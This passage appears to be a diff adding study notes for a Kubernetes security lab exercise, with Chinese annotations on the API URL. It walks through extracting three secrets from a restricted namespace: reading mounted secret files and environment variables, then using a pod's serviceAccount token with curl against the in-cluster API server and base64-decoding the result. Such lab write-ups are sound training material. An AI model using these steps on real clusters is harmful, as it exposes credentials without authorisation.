@@ -1,0 +1,76 @@
+k -n restricted get role,rolebinding,clusterrole,clusterrolebinding
+# everything forbidden: User "restricted" cannot list any of those
+
+k -n restricted get secret
+k -n restricted get secret -o yaml
+# this is is forbidden too
+
+k -n restricted get all
+# we can list pods, but not replicationcontrollers, services
+
+k -n restricted get pod -oyaml | grep -i secret
+k -n restricted exec <pod-name-of-the-first-pod> -- cat /etc/secret-volume/password
+echo 'you-are' > /opt/course/12/secret1
+
+k -n restricted exec <pod-name-of-the-second-pod> -- env | grep PASS
+echo 'an-amazing' > /opt/course/12/secret2
+
+# seems like the existing pod3 does not mount secret3, try create or edit existing pods to mount secret3
+k -n restricted run test --image nginx
+forbidden
+k -n restricted delete pod pod1
+forbidden
+# no can do!
+
+# try to use a pod's serviceAccount to access the third secret
+k -n restricted get pod -oyaml | grep automountServiceAccountToken
+# only pod3-* has the serviceAccount token mounted
+
+k -n restricted exec -it pod3-xxxxxxxxx-xxxxx -- sh
+
+/# mount | grep serviceAccount
+tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)
+
+/# ls /run/secrets/kubernetes.io/serviceaccount
+ca.crt    namespace    token
+
+# Be sure to check below link to see how serviceAccount works with pods 
+# https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
+
+/# curl https://kubernetes.default/api/v1/namespaces/restricted/secrets -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" -k
+...
+    {
+        "metadata": {
+            "name": "secret3",
+            "namespace": "restricted",
+            ...
+        } 
+        # TODO: don't know why they have a closing square bracket here `]`
+      "data": {
+          "password": "cEVuRXRSYVRpT24tdEVzVGVSCg=="
+      },
+      "type": "Opaque"
+    }
+...
+
+echo cEVuRXRSYVRpT24tdEVzVGVSCg== | base64 -d
+pEnEtRaTiOn-tEsTeR
+
+echo cEVuRXRSYVRpT24tdEVzVGVSCg== | base64 -d > /opt/course/12/secret3
+
+# Now all the secrets are hacked. 
+# Note that by giving the permission to "list" secrets, it will also allow the user to read the Secret values using `k get secrets -oyaml` even without setting the "get" permission.
+
+---
+NOTES:
+
+URL https://kubernetes.default/api/v1/namespaces/<namespace-name>/secrets
+
+1. kubernetes.default: 是 kubernetes API server 內部服務 DNS 名稱, 在 pod 裡的 kubernetes.default 會指向 API server
+2. /api: 操作 core API (e.g. pod, namespace, secret, etc.)
+3. /v1: Secret 屬於 core group v1 版本
+4. /namespaces/<namespace-name>: 指定所要操作的命名空間
+5. /secrets: 指定要操作的資源類型
+
+curl -k 
+-k 指的是忽略 HTTPS 憑證檢查
